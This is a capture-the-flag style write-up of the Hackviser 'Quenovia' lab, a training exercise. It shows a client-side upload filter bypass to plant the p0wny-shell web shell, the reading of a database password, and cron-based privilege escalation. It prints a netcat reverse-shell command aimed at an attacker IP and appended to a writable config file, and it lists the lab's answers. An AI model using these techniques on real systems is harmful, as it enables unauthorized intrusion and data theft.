---
title: 'Quenovia'
date: '2026-03-27'
excerpt: 'Practice exploiting a vulnerability in a web application to get a reverse shell from the machine, and to practice privilege escalation attacks that result from misconfiguring a scheduled task on the machine.'
prog: 'Hackviser Warmup Stage 3  -  March 2026'
---

<div class="writeup-header">
<img src="/assets/hackinglabs/hackviser/warmups/quenovia/quenovia_hackviser_logo.png" alt="Quenovia logo" class="writeup-logo" />
<div class="writeup-header-text">
<div class="writeup-org">Hackviser</div>
<h1 class="writeup-title">Quenovia</h1>
<div class="writeup-date">March 2026 &middot; Warmup Stage 3</div>
</div>
</div>
<p class="lead mb-4">On Linux systems, a "cronjob" is a scheduling service used to automatically run commands or scripts at specific times. It is recommended to practice exploiting a vulnerability in a web application to get a reverse shell from the machine, and to practice privilege escalation attacks that result from misconfiguring a scheduled task on the machine.</p>

<h4 class="mb-3">Tasks</h4>
<p class="mb-2"><strong>Question 1:</strong> What is the site title?</p>
<p class="mb-3">Open the target site in a web browser and see the title in the browser tab.</p>
<img src="/assets/hackinglabs/hackviser/warmups/quenovia/quenovia_hackviser_image1.png" alt="Quenovia Image 1" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-5"><strong>Answer:</strong> Quenovia</p>
<br />

<p class="mb-2"><strong>Question 2:</strong> Which file types are allowed to be uploaded to the profile photo field in the visa application?</p>
<p class="mb-3">Click Apply for Visa, then scroll down to the Profile Photo section, and click Browse. Notice that the allowed file types are displayed in the file selection dialog.</p>
<img src="/assets/hackinglabs/hackviser/warmups/quenovia/quenovia_hackviser_image2.png" alt="Quenovia Image 2" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-5"><strong>Answer:</strong> Image</p>
<br />

<p class="mb-2"><strong>Question 3:</strong> What is the database password?</p>
<p class="mb-3">We need to exploit a vulnerability in the web application to gain access to the database. We can attempt to use file upload functionality to upload a malicious file that will give us access. Let's attempt to allow the web application to allow uploads of other file types by inspecting the Browse functionality, and changing <code>accept="image/*"</code> to <code>accept="*"</code>.</p>
<img src="/assets/hackinglabs/hackviser/warmups/quenovia/quenovia_hackviser_image3.png" alt="Quenovia Image 3" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-3">Then we upload p0wny-shell.php (<a href="https://github.com/flozz/p0wny-shell" target="_blank" referrerpolicy="no-referrer">GitHub repository here</a>). Fill up the other details too with dummy information to prevent errors in receiving our application.</p>
<img src="/assets/hackinglabs/hackviser/warmups/quenovia/quenovia_hackviser_image4.png" alt="Quenovia Image 4" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<img src="/assets/hackinglabs/hackviser/warmups/quenovia/quenovia_hackviser_image5.png" alt="Quenovia Image 5" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-3">Apparently directory listing is enabled on the vulnerable web application. This makes it easier for us to access our web shell.</p>
<img src="/assets/hackinglabs/hackviser/warmups/quenovia/quenovia_hackviser_image6.png" alt="Quenovia Image 6" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-3">Now we can open our web shell in a new tab and since it is interactive, we can directly enter necessary commands to find the database file. After some browsing, we encounter the <code>db_connect.php</code> file.</p>
<img src="/assets/hackinglabs/hackviser/warmups/quenovia/quenovia_hackviser_image7.png" alt="Quenovia Image 7" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<img src="/assets/hackinglabs/hackviser/warmups/quenovia/quenovia_hackviser_image8.png" alt="Quenovia Image 8" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-5"><strong>Answer:</strong> c2e5-4b76-812c</p>
<br />

<p class="mb-2"><strong>Question 4:</strong> What is the full path to the file containing system-wide scheduled tasks (cron jobs)?</p>
<p class="mb-5"><strong>Answer:</strong> /etc/crontab</p>
<br />

<p class="mb-2"><strong>Question 5:</strong> What is the name of the command or script that is run once per minute as a scheduled task (cron job)?</p>
<p class="mb-3">We can just run <code>cat /etc/crontab</code> to analyse the contents of the cron jobs.</p>
<img src="/assets/hackinglabs/hackviser/warmups/quenovia/quenovia_hackviser_image9.png" alt="Quenovia Image 9" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-5"><strong>Answer:</strong> clean_logs.sh</p>
<br />

<p class="mb-2"><strong>Question 6:</strong> Which date was the database backup taken?</p>
<p class="mb-3">Next, we need to find the backup directory. After some browsing, we discover that the backup directory is located at <code>/backups</code>. Listing out the contents reveals a SQL backup file. However, our attempt of reading it is unsuccessful due to lack of permissions.</p>
<img src="/assets/hackinglabs/hackviser/warmups/quenovia/quenovia_hackviser_image10.png" alt="Quenovia Image 10" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-3">Using our previous finding of the clean_logs.sh file, let's analyse the contents of the shell script. The script reveals that the /var/www/config.conf file was executed via the <code>source</code> command. We then check for the permissions of the clean_logs.sh file and of the config.conf file.</p>
<img src="/assets/hackinglabs/hackviser/warmups/quenovia/quenovia_hackviser_image11.png" alt="Quenovia Image 11" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-3">It turns out that the config file is writable by the current logged in user (<code>www-data</code>). The next step is to achieve a reverse shell. First lets enable a listener on our local machine using <code>nc -lnvp 1337</code>.</p>
<p class="mb-3">We can use <code>echo "nc [Attacker IP address] 1337 -e /bin/bash" >> /var/www/config.conf</code> and once the cronjob runs, we get a connection on our local machine.</p>
<img src="/assets/hackinglabs/hackviser/warmups/quenovia/quenovia_hackviser_image12.png" alt="Quenovia Image 12" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-3">Now that we receive a connection, we have successfully achieved a reverse shell. Use <code>whoami</code> to verify the current user, and use <code>pwd</code> to check the current directory. Then navigate accordingly and use <code>head visa_applications.sql.backup.sql</code> to view the contents of the backup file.</p>
<img src="/assets/hackinglabs/hackviser/warmups/quenovia/quenovia_hackviser_image13.png" alt="Quenovia Image 13" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-5"><strong>Answer:</strong> 14.06.2023</p>


<hr />
<section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
<p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the next Hacking Lab.</p>
<p class="mb-0" style="font-weight:700;">@aaronamran</p>
<p class="text-muted small mt-1">March 2026</p>
</section>

<div class="writeup-nav">
</div>
</div>